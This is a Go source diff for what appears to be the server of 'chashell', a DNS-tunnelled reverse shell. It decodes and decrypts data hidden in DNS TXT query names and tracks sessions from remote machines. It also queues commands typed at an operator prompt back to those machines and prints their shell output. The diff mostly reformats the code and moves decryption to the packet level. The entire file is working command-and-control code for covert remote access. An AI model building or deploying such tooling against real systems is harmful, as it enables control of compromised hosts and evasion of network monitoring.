@@ -10,55 +10,53 @@ import (
 	"fmt"
 	"github.com/c-bata/go-prompt"
 	"github.com/golang/protobuf/proto"
+	"github.com/miekg/dns"
 	"log"
 	"net"
 	"os"
 	"strconv"
 	"strings"
-	"github.com/miekg/dns"
 	"sync"
 	"time"
 )
-
 
 var currentSession string
 var packetBuffer bytes.Buffer
 var conn net.Conn
 
 var (
-	targetDomain string
+	targetDomain  string
 	encryptionKey string
 )
-
 
 var packetQueue = map[string][]string{}
 
 var sessionsMap = map[string]*clientInfo{}
 
 type clientInfo struct {
-	hostname string
+	hostname  string
 	heartbeat int64
-	mutex sync.Mutex
-	conn map[int32]connData
+	mutex     sync.Mutex
+	conn      map[int32]connData
 }
 
 type connData struct {
 	chunkSize int32
-	nonce []byte
-	packets map[int32]string
+	nonce     []byte
+	packets   map[int32]string
 }
 
+func (ci *clientInfo) getChunk(chunkId int32) connData {
 
-func (ci *clientInfo) getChunk(chunkId int32)(connData) {
 	return ci.conn[chunkId]
 
 }
-
 
 func parseQuery(m *dns.Msg) {
 	for _, q := range m.Question {
 		switch q.Qtype {
 		case dns.TypeTXT:
+
 			dataPacket := strings.Replace(strings.Replace(q.Name, targetDomain, "", -1), ".", "", -1)
 
 			dataPacketRaw, err := hex.DecodeString(dataPacket)
@@ -67,8 +65,15 @@ func parseQuery(m *dns.Msg) {
 				log.Printf("Unable to decode data packet : %s", dataPacket)
 			}
 
+			output, valid := crypto.Open(dataPacketRaw[24:], dataPacketRaw[:24], encryptionKey)
+
+			if !valid {
+				log.Printf("Received invalid/corrupted packet. Dropping.\n")
+				break
+			}
+
 			message := &chacomm.Message{}
-			if err := proto.Unmarshal(dataPacketRaw, message); err != nil {
+			if err := proto.Unmarshal(output, message); err != nil {
 				log.Fatalln("Failed to parse message packet:", err)
 			}
 
@@ -81,7 +86,6 @@ func parseQuery(m *dns.Msg) {
 				break
 			}
 
-
 			session, valid := sessionsMap[clientGuid]
 
 			if !valid {
@@ -91,26 +95,22 @@ func parseQuery(m *dns.Msg) {
 				session = sessionsMap[clientGuid]
 			}
 
+			session.heartbeat = now.Unix()
+
 			session.mutex.Lock()
 
 			switch u := message.Packet.(type) {
 			case *chacomm.Message_Pollquery:
-				output, valid := crypto.Open(u.Pollquery.Identifier, u.Pollquery.Nonce, encryptionKey)
-				if valid {
-					session.hostname = string(output)
-					session.heartbeat = now.Unix()
 
-					queue, valid := packetQueue[clientGuid]
+				queue, valid := packetQueue[clientGuid]
 
-					if valid && len(queue) > 0 {
-						answer = queue[0]
-						packetQueue[clientGuid] = queue[1:]
-					}
+				if valid && len(queue) > 0 {
+					answer = queue[0]
+					packetQueue[clientGuid] = queue[1:]
 				}
 
-
 			case *chacomm.Message_Chunkstart:
-				session.conn[u.Chunkstart.Chunkid] = connData{chunkSize: u.Chunkstart.Chunksize, nonce: u.Chunkstart.Nonce, packets: make(map[int32]string)}
+				session.conn[u.Chunkstart.Chunkid] = connData{chunkSize: u.Chunkstart.Chunksize, packets: make(map[int32]string)}
 
 			case *chacomm.Message_Chunkdata:
 
@@ -118,32 +118,22 @@ func parseQuery(m *dns.Msg) {
 
 				connection.packets[u.Chunkdata.Chunknum] = string(u.Chunkdata.Packet)
 
-
 				if len(connection.packets) == int(connection.chunkSize) {
 					var chunkBuffer bytes.Buffer
 					for i := 0; i <= int(connection.chunkSize)-1; i++ {
 						chunkBuffer.WriteString(connection.packets[int32(i)])
 					}
 
-					output, valid := crypto.Open(chunkBuffer.Bytes(), connection.nonce, encryptionKey)
-
-
-					if valid {
-						if currentSession == clientGuid {
-							fmt.Printf("%s", output)
-						}
-					} else {
-						log.Fatal("Invalid data !\n")
+					if currentSession == clientGuid {
+						fmt.Printf("%s", chunkBuffer.Bytes())
 					}
 				}
-
-
 
 			default:
 				log.Printf("Unknown message type received : %v\n", u)
 			}
 			session.mutex.Unlock()
-			rr, _ := dns.NewRR(fmt.Sprintf("%s TXT %s", q.Name, answer))
+			rr, _ := dns.NewRR(fmt.Sprintf("%s TXT %s", ".", answer))
 			m.Answer = append(m.Answer, rr)
 
 		}
@@ -165,14 +155,14 @@ func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
 	w.WriteMsg(m)
 }
 
-func ShellServer(sessionId string){
+func ShellServer(sessionId string) {
 	currentSession = sessionId
 	scanner := bufio.NewScanner(os.Stdin)
 	for scanner.Scan() {
 		if scanner.Text() == "background" {
 			return
 		}
-		initPacket, dataPackets := transport.Encode([]byte(scanner.Text() + "\n"), false, encryptionKey, targetDomain, nil)
+		initPacket, dataPackets := transport.Encode([]byte(scanner.Text()+"\n"), false, encryptionKey, targetDomain, nil)
 		_, valid := packetQueue[sessionId]
 		if !valid {
 			packetQueue[sessionId] = make([]string, 0)
@@ -187,7 +177,6 @@ func ShellServer(sessionId string){
 		fmt.Fprintln(os.Stderr, "reading standard input:", err)
 	}
 }
-
 
 var commands = []prompt.Suggest{
 	{Text: "sessions", Description: "Interact with the specified machine."},
@@ -214,7 +203,7 @@ func argumentsCompleter(args []string) []prompt.Suggest {
 		second := args[1]
 		if len(args) == 2 {
 			sessions := []prompt.Suggest{}
-			for clientGuid, clientInfo:= range sessionsMap {
+			for clientGuid, clientInfo := range sessionsMap {
 				sessions = append(sessions, prompt.Suggest{Text: clientGuid, Description: clientInfo.hostname})
 			}
 
@@ -228,7 +217,7 @@ func argumentsCompleter(args []string) []prompt.Suggest {
 func executor(in string) {
 	args := strings.Split(in, " ")
 	if len(args) > 0 {
-		switch args[0]{
+		switch args[0] {
 		case "exit":
 			fmt.Println("Exiting.")
 			os.Exit(0)
@@ -261,12 +250,12 @@ func main() {
 		}
 	}()
 
-	go func(){
+	go func() {
 		for {
 			time.Sleep(1 * time.Second)
 			now := time.Now()
 			for clientGuid, session := range sessionsMap {
-				if session.heartbeat + 30 < now.Unix() {
+				if session.heartbeat+30 < now.Unix() {
 					log.Printf("Client timed out [%s].\n", clientGuid)
 					// Delete from sessions list.
 					delete(sessionsMap, clientGuid)
@@ -279,7 +268,6 @@ func main() {
 
 	p := prompt.New(executor, Completer, prompt.OptionPrefix("chashell >>> "))
 	p.Run()
-
 
 	//ShellServer()
 
